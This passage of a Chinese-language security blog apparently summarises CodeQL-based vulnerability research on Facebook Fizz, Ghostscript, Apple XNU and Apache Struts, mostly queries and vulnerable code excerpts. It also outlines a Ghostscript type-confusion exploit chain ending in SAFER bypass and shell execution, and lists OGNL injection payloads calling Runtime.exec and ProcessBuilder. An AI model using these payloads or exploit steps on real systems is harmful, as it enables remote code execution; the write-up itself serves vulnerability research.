class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> RemoteUserInput <span class="keyword">source</span>, UnsafeDeserializationSink sink</span><br><span class="line"><span class="keyword">where</span> source.flowsTo(sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, sink</span><br></pre></td></tr></table></figure><h2 id="Facebook-Fizz-integer-overflow-vulnerability-CVE-2019-3560"><a href="#Facebook-Fizz-integer-overflow-vulnerability-CVE-2019-3560" class="headerlink" title="Facebook Fizz integer overflow vulnerability (CVE-2019-3560)"></a>Facebook Fizz integer overflow vulnerability (CVE-2019-3560)</h2><blockquote><p>We have deployed Fizz and TLS 1.3 globally in our mobile apps, Proxygen, our load balancers, our internal services, and even our QUIC library, mvfst. More than 50 percent of our internet traffic is now secured with TLS 1.3.</p></blockquote><p>大写的不懂Fizz….</p><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">auto</span> length = cursor.readBE&lt;<span class="keyword">uint16_t</span>&gt;();</span><br><span class="line"><span class="keyword">if</span> (buf.chainLength() &lt; (cursor - buf.front()) + length) &#123;</span><br><span class="line">  <span class="keyword">return</span> folly::none;</span><br><span class="line">&#125;</span><br><span class="line">length +=</span><br><span class="line">    <span class="keyword">sizeof</span>(ContentType) + <span class="keyword">sizeof</span>(ProtocolVersion) + <span class="keyword">sizeof</span>(<span class="keyword">uint16_t</span>);</span><br><span class="line">buf.trimStart(length);</span><br><span class="line"><span class="keyword">continue</span>;</span><br></pre></td></tr></table></figure><p>length+=的时候整数溢出；攻击者设置<code>length = 0xFFFB</code>，可以过验证然后溢出。</p><h3 id="CodeQL"><a href="#CodeQL" class="headerlink" title="CodeQL"></a>CodeQL</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Fizz Overflow</span></span><br><span class="line"><span class="comment"> * @description Narrowing conversions on untrusted data could enable</span></span><br><span class="line"><span class="comment"> *              an attacker to trigger an integer overflow.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cpp</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.dataflow.TaintTracking</span><br><span class="line"><span class="keyword">import</span> semmle.code.cpp.ir.IR</span><br><span class="line"><span class="keyword">import</span> DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The endianness conversion function `Endian::big()`.</span></span><br><span class="line"><span class="comment"> * It is Folly's replacement for `ntohs` and `ntohl`.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EndianConvert</span> <span class="title">extends</span> <span class="title">Function</span> &#123;</span></span><br><span class="line">  EndianConvert() &#123;</span><br><span class="line">    <span class="keyword">this</span>.getName() = <span class="string">"big"</span> <span class="keyword">and</span></span><br><span class="line">    <span class="keyword">this</span>.getDeclaringType().getName().matches(<span class="string">"Endian"</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Cfg extends TaintTracking::Configuration &#123;</span><br><span class="line">  Cfg() &#123; <span class="keyword">this</span> = <span class="string">"FizzOverflowIR"</span> &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Holds if `source` is a call to `Endian::big()`. */</span></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    source.(CallInstruction).getCallTarget().(FunctionInstruction).getFunctionSymbol() instanceof</span><br><span class="line">      EndianConvert</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Hold if `sink` is a narrowing conversion. */</span></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    sink.getResultSize() &lt; sink.(ConvertInstruction).getUnary().getResultSize()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from</span><br><span class="line">  Cfg cfg, DataFlow::PathNode source, DataFlow::PathNode sink, ConvertInstruction conv,</span><br><span class="line">  Type inputType, Type outputType</span><br><span class="line">where</span><br><span class="line">  cfg.hasFlowPath(source, sink) <span class="keyword">and</span></span><br><span class="line">  conv = sink.getNode() <span class="keyword">and</span></span><br><span class="line">  inputType = conv.getUnary().getResultType() <span class="keyword">and</span></span><br><span class="line">  outputType = conv.getResultType()</span><br><span class="line">select sink, source, sink,</span><br><span class="line">  <span class="string">"Conversion of untrusted data from "</span> + inputType + <span class="string">" to "</span> + outputType + <span class="string">"."</span></span><br></pre></td></tr></table></figure><p>可以精确查询出上述漏洞。</p><h2 id="CVE-2018-19475-Ghostscript-shell-command-execution-in-SAFER-mode"><a href="#CVE-2018-19475-Ghostscript-shell-command-execution-in-SAFER-mode" class="headerlink" title="CVE-2018-19475: Ghostscript shell command execution in SAFER mode"></a>CVE-2018-19475: Ghostscript shell command execution in SAFER mode</h2><p>Ghostscript是PostScript的解释器。</p><p>用CodeQL搜索关于权限控制的代码。</p><h2 id="GhostButt-CVE-2017-8291利用分析"><a href="#GhostButt-CVE-2017-8291利用分析" class="headerlink" title="GhostButt - CVE-2017-8291利用分析"></a>GhostButt - CVE-2017-8291利用分析</h2><ul><li>因为<code>.eqproc</code>运算符没有检查类型，任意两个类型都能比较，所以可以使堆栈指针上溢；</li><li>上溢后再类型混淆，使之与string buffer重叠（也不叫类型混淆，堆块重叠）；</li><li>利用string buffer覆盖device的LockSafetyParams属性过SAFER Bypass；</li></ul><h2 id="怎么挖Ghostscript-type-confusion"><a href="#怎么挖Ghostscript-type-confusion" class="headerlink" title="怎么挖Ghostscript type confusion"></a>怎么挖Ghostscript type confusion</h2><h3 id="Ghostscript中有很多类型混淆"><a href="#Ghostscript中有很多类型混淆" class="headerlink" title="Ghostscript中有很多类型混淆"></a>Ghostscript中有很多类型混淆</h3><p>比如：<a href="https://paper.seebug.org/310/" target="_blank" rel="noopener">GhostButt - CVE-2017-8291利用分析</a></p><p>还有一些类型混淆和任意文件读取</p><ul><li><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1640" target="_blank" rel="noopener">https://bugs.chromium.org/p/project-zero/issues/detail?id=1640</a></li><li><a href="https://seclists.org/oss-sec/2016/q4/29" target="_blank" rel="noopener">https://seclists.org/oss-sec/2016/q4/29</a></li><li><a href="https://bugs.ghostscript.com/show_bug.cgi?id=697169" target="_blank" rel="noopener">https://bugs.ghostscript.com/show_bug.cgi?id=697169</a></li></ul><h3 id="举个栗子"><a href="#举个栗子" class="headerlink" title="举个栗子"></a>举个栗子</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ref_s</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tas_s</span> <span class="title">tas</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">union</span> v &#123;<span class="comment">/* name the union to keep gdb happy */</span></span><br><span class="line">        ps_int intval;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">uint64_t</span> dummy; <span class="comment">/* force 16-byte ref on 32-bit platforms */</span></span><br><span class="line">    &#125; value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Postscript对象在Ghostscript中用上面那个结构体表示，value不好好check很容易类型混淆。比如下面那样：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">  os_ptr op = osp; <span class="comment">//&lt;--- comes from postscript</span></span><br><span class="line">  </span><br><span class="line">  ref obj1;</span><br><span class="line">  ref obj2;</span><br><span class="line"></span><br><span class="line">  check_type(op, t_dictionary);</span><br><span class="line">  code = dict_find_string(op, <span class="string">"field"</span>, &amp;obj1); <span class="comment">//&lt;--- OK</span></span><br><span class="line">  <span class="keyword">if</span> (code &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    code = array_get(imemory, obj1, <span class="number">0</span>, &amp;obj2); <span class="comment">//&lt;--- OK, array_get checks type</span></span><br><span class="line">    <span class="keyword">if</span> (code &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      doSomething(obj2);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">doSomething</span><span class="params">(ref* obj)</span> </span>&#123;</span><br><span class="line">  ref* obj3;</span><br><span class="line">  <span class="keyword">int</span> code = dict_find_string(obj2, <span class="string">"something"</span>, &amp;obj3); <span class="comment">//&lt;--- What's the type of obj2?!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CodeQL检查类似问题"><a href="#CodeQL检查类似问题" class="headerlink" title="CodeQL检查类似问题"></a>CodeQL检查类似问题</h3><p>确定source, sink and sanitizer(s).</p><h4 id="source"><a href="#source" class="headerlink" title="source"></a>source</h4><p>source为operand stack：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">predicate isOSPSource(DataFlow::Node source) &#123;</span><br><span class="line">  exists(FieldAccess fa | isOSPAccess(fa) and source.asExpr() = fa)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sink"><a href="#sink" class="headerlink" title="sink"></a>sink</h4><p>sink是Access to internal data field：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Access to a variable of type `ref` or various other equivalent types.*/</span></span><br><span class="line">class RefAccess extends Expr &#123;</span><br><span class="line">  <span class="comment">/** The variable of this `ref`*/</span></span><br><span class="line">  Variable v;</span><br><span class="line">  </span><br><span class="line">  RefAccess() &#123;</span><br><span class="line">    (v.getAnAccess() = this or v.getAnAccess() = this.(AddressOfExpr).getAnOperand()) and </span><br><span class="line">    exists(string name | v.getType().getName() = name | </span><br><span class="line">      v.getType() instanceof PointerType or</span><br><span class="line">      name = "os_ptr" or name = "const_os_ptr" or</span><br><span class="line">      name = "const os_ptr" or name = "ref" or</span><br><span class="line">      name = "const ref"</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  Variable getVariable() &#123;</span><br><span class="line">    result = v</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/** Convenient predicate to check that two access are to the same variable.*/</span></span><br><span class="line">  predicate isEquivalent(RefAccess other) &#123;</span><br><span class="line">    this.getVariable() = other.getVariable()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">class TypeFieldAccess extends FieldAccess &#123;</span><br><span class="line">  TypeFieldAccess() &#123;</span><br><span class="line">    exists(FieldAccess f | f.getTarget().hasName("value") and</span><br><span class="line">      this.getQualifier() = f and this.getTarget().getDeclaringType().hasName("v")</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  RefAccess getRef() &#123;</span><br><span class="line">    result = this.getQualifier().(FieldAccess).getQualifier()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sanitizer"><a href="#sanitizer" class="headerlink" title="sanitizer"></a>sanitizer</h4><p>可以将<code>obj-&gt;tas.type_attrs == some_type</code>视为类型检查。</p><h4 id="Adding-support-to-track-through-collection-fetching-methods"><a href="#Adding-support-to-track-through-collection-fetching-methods" class="headerlink" title="Adding support to track through collection-fetching methods"></a>Adding support to track through collection-fetching methods</h4><p>添加一些数据流路径。</p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p>找到了一些有趣的东西(CVE-2018-19134)：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">zsetcolor(<span class="keyword">i_ctx_t</span> * i_ctx_p)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((n_comps = cs_num_components(pcs)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        n_comps = -n_comps;</span><br><span class="line">        <span class="keyword">if</span> (r_has_type(op, t_dictionary)) &#123;</span><br><span class="line">            ref     *pImpl, pPatInst;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((code = dict_find_string(op, <span class="string">"Implementation"</span>, &amp;pImpl)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> code;</span><br><span class="line">            <span class="keyword">if</span> (code &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                code = array_get(imemory, pImpl, <span class="number">0</span>, &amp;pPatInst); <span class="comment">//&lt;--- Reported by Tavis Ormandy</span></span><br><span class="line">                <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> code;</span><br><span class="line">                cc.pattern = r_ptr(&amp;pPatInst, <span class="keyword">gs_pattern_instance_t</span>); <span class="comment">//&lt;--- What's the type of &amp;pPatInst?!</span></span><br></pre></td></tr></table></figure><p>还有：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (r_has_type(op, t_dictionary)) &#123;</span><br><span class="line">  check_dict_read(*op);</span><br><span class="line">  <span class="keyword">if</span> ( dict_find_string(op, <span class="string">".jbig2globalctx"</span>, &amp;sop) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    gref = r_ptr(sop, <span class="keyword">s_jbig2_global_data_t</span>); <span class="comment">//&lt;--- What type is sop?!</span></span><br><span class="line">    s_jbig2decode_set_global_data((stream_state*)&amp;state, gref);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CVE-2018-19134-–-Ghostscript类型混淆的利用"><a href="#CVE-2018-19134-–-Ghostscript类型混淆的利用" class="headerlink" title="CVE-2018-19134 – Ghostscript类型混淆的利用"></a>CVE-2018-19134 – Ghostscript类型混淆的利用</h2><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span></span><br><span class="line">zsetcolor(<span class="keyword">i_ctx_t</span> * i_ctx_p)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> ((n_comps = cs_num_components(pcs)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        n_comps = -n_comps;</span><br><span class="line">        <span class="keyword">if</span> (r_has_type(op, t_dictionary)) &#123;</span><br><span class="line">            ref     *pImpl, pPatInst;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ((code = dict_find_string(op, <span class="string">"Implementation"</span>, &amp;pImpl)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> code;</span><br><span class="line">            <span class="keyword">if</span> (code &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                code = array_get(imemory, pImpl, <span class="number">0</span>, &amp;pPatInst); <span class="comment">//&lt;--- Reported by Tavis Ormandy</span></span><br><span class="line">                <span class="keyword">if</span> (code &lt; <span class="number">0</span>)</span><br><span class="line">                    <span class="keyword">return</span> code;</span><br><span class="line">                cc.pattern = r_ptr(&amp;pPatInst, <span class="keyword">gs_pattern_instance_t</span>); <span class="comment">//&lt;--- What's the type of &amp;pPatInst?!</span></span><br><span class="line">                n_numeric_comps = ( pattern_instance_uses_base_space(cc.pattern) ? n_comps - <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> r_ptr(rp,typ) ((typ *)((rp)-&gt;value.pstruct))</span></span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">pattern_instance_uses_base_space(<span class="keyword">const</span> <span class="keyword">gs_pattern_instance_t</span> * pinst)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> pinst-&gt;type-&gt;procs.uses_base_space(</span><br><span class="line">           pinst-&gt;type-&gt;procs.get_pattern(pinst) );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到<code>(rp)-&gt;value.pstruct</code>是由用户控制的，被强行解析成了<code>gs_pattern_instance_t</code>。</p><h3 id="利用思路-2"><a href="#利用思路-2" class="headerlink" title="利用思路"></a>利用思路</h3><h4 id="fakeObject"><a href="#fakeObject" class="headerlink" title="fakeObject"></a>fakeObject</h4><p><code>GS&gt;&lt;&lt;/Implementation [[16#41 [16#51 16#52]]] &gt;&gt; setpattern</code>这样可以控制部分数据。</p><p>可以劫持函数指针为内置函数，然后控制上下文，即函数调用参数即可。</p><h4 id="任意地址读写原语"><a href="#任意地址读写原语" class="headerlink" title="任意地址读写原语"></a>任意地址读写原语</h4><p>需要找到合适的函数来控制参数；利用pop控制参数；用CodeQL查找（硬广）。</p><p>Now we need to create a large array object and store it in the 39th element of pinst. It’s metadata tas will then be interpreted as the stack pointer address osp. I’ll use the PostScript operator put as its first element, then use pop to change its type to string and read off the address of the zput function.</p><h4 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a>任意代码执行</h4><p>调用一个SAFER模式无法调用的函数，修改它的安全设置，然后任意shell执行。在<a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2" target="_blank" rel="noopener">in one of Tavis Ormandy’s Ghostscript vulnerabilities</a>里也被用到。</p><ol><li>Create a fake operand stack with arguments that I want to supply to forceput;</li><li>Overwrite the location in pinst that stores the address of the operand stack pointer to the address of what I created above;</li><li>Get the address of forceput and replace pinst-&gt;type.procs.getpattern with its address.</li></ol><h2 id="Apple-XNU-exploits-ICMP-proof-of-concept"><a href="#Apple-XNU-exploits-ICMP-proof-of-concept" class="headerlink" title="Apple XNU exploits: ICMP proof of concept"></a>Apple XNU exploits: ICMP proof of concept</h2><h3 id="ICMP-packet-handling-code-CVE-2018-4407"><a href="#ICMP-packet-handling-code-CVE-2018-4407" class="headerlink" title="ICMP packet-handling code (CVE-2018-4407)"></a>ICMP packet-handling code (CVE-2018-4407)</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @name Paths from ip_input to icmp_error</span></span><br><span class="line"><span class="comment"> * @description Find data-flow paths that lead from ip_input to the first parameter of icmp_error.</span></span><br><span class="line"><span class="comment"> * @kind path-problem</span></span><br><span class="line"><span class="comment"> * @problem.severity warning</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">import cpp</span><br><span class="line">import semmle.code.cpp.dataflow.DataFlow</span><br><span class="line">import DataFlow::PathGraph</span><br><span class="line"></span><br><span class="line">class Config extends DataFlow::Configuration &#123;</span><br><span class="line">  Config() &#123; this = "tcphdr_flow" &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123;</span><br><span class="line">    exists (source.asExpr()) and</span><br><span class="line">    source.getFunction().getName() = "ip_input"</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123;</span><br><span class="line">    <span class="comment">/* The sink is the zero'th parameter of `icmp_error`: `struct mbuf *n`. */</span></span><br><span class="line">    exists (Parameter p</span><br><span class="line">    | p = sink.asParameter() and</span><br><span class="line">      p.getFunction().getName() = "icmp_error" and</span><br><span class="line">      p.getIndex() = 0)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  override predicate isBarrier(DataFlow::Node node) &#123;</span><br><span class="line">    node.getFunction().getName() = "ip_forward"</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">from Config cfg, DataFlow::PathNode source, DataFlow::PathNode sink</span><br><span class="line">where cfg.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">source</span>, <span class="keyword">source</span>, sink, <span class="string">"Expression flows to icmp_error."</span></span><br></pre></td></tr></table></figure><h3 id="Client-side-NFS-vulnerabilities-CVE-2018-4259-CVE-2018-4286-CVE-2018-4287-CVE-2018-4288-CVE-2018-4291"><a href="#Client-side-NFS-vulnerabilities-CVE-2018-4259-CVE-2018-4286-CVE-2018-4287-CVE-2018-4288-CVE-2018-4291" class="headerlink" title="Client-side NFS vulnerabilities (CVE-2018-4259, CVE-2018-4286, CVE-2018-4287, CVE-2018-4288, CVE-2018-4291)"></a>Client-side NFS vulnerabilities (CVE-2018-4259, CVE-2018-4286, CVE-2018-4287, CVE-2018-4288, CVE-2018-4291)</h3><h4 id="CVE-2018-4259"><a href="#CVE-2018-4259" class="headerlink" title="CVE-2018-4259"></a>CVE-2018-4259</h4><p><code>(FHP)-&gt;fh_len</code>没有检查长度：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* get the size of and data for a file handle in an mbuf chain */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nfsm_chain_get_fh(E, NMC, VERS, FHP) \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; \</span><br><span class="line">    <span class="keyword">if</span> ((VERS) != NFS_VER2) \</span><br><span class="line">      nfsm_chain_get_32((E), (NMC), (FHP)-&gt;fh_len); \</span><br><span class="line">    <span class="keyword">else</span> \</span><br><span class="line">      (FHP)-&gt;fh_len = NFSX_V2FH;\</span><br><span class="line">    nfsm_chain_get_opaque((E), (NMC), (<span class="keyword">uint32_t</span>)(FHP)-&gt;fh_len, (FHP)-&gt;fh_data);\</span><br><span class="line">    <span class="keyword">if</span> (E) \</span><br><span class="line">      (FHP)-&gt;fh_len = <span class="number">0</span>;\</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><code>rndlen = nfsm_rndup(LEN);</code>这句话使rndlen溢出为0，绕过下方检查：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* copy the next consecutive bytes of opaque data from an mbuf chain */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nfsm_chain_get_opaque(E, NMC, LEN, PTR) \</span></span><br><span class="line">  <span class="keyword">do</span> &#123; \</span><br><span class="line">    <span class="keyword">uint32_t</span> rndlen; \</span><br><span class="line">    <span class="keyword">if</span> (E) <span class="keyword">break</span>; \</span><br><span class="line">    rndlen = nfsm_rndup(LEN); \</span><br><span class="line">    <span class="keyword">if</span> ((NMC)-&gt;nmc_left &gt;= rndlen) &#123; \</span><br><span class="line">      u_char *__tmpptr = (u_char*)(NMC)-&gt;nmc_ptr; \</span><br><span class="line">      (NMC)-&gt;nmc_left -= rndlen; \</span><br><span class="line">      (NMC)-&gt;nmc_ptr += rndlen; \</span><br><span class="line">      bcopy(__tmpptr, (PTR), (LEN)); \</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; \</span><br><span class="line">      (E) = nfsm_chain_get_opaque_f((NMC), (LEN), (u_char*)(PTR)); \</span><br><span class="line">    &#125; \</span><br><span class="line">  &#125; <span class="keyword">while</span> (<span class="number">0</span>)</span><br></pre></td></tr></table></figure><h2 id="OGNL-Apache-Struts-exploit-Weaponizing-a-sandbox-bypass-CVE-2018-11776"><a href="#OGNL-Apache-Struts-exploit-Weaponizing-a-sandbox-bypass-CVE-2018-11776" class="headerlink" title="OGNL Apache Struts exploit: Weaponizing a sandbox bypass(CVE-2018-11776)"></a>OGNL Apache Struts exploit: Weaponizing a sandbox bypass(CVE-2018-11776)</h2><ul><li>早期攻击，访问全局变量改权限<ul><li>(#_memberAccess[‘allowStaticMethodAccess’]=true).(@java.lang.Runtime@getRuntime().exec(‘xcalc’))</li></ul></li><li>还有这种<ul><li>(#p=new java.lang.ProcessBuilder(‘xcalc’)).(#p.start())</li></ul></li><li>静态方法和构造函数都没有了，还有任意类访问<ul><li>(<a href="mailto:#_memberAccess=@ognl.OgnlContext" target="_blank" 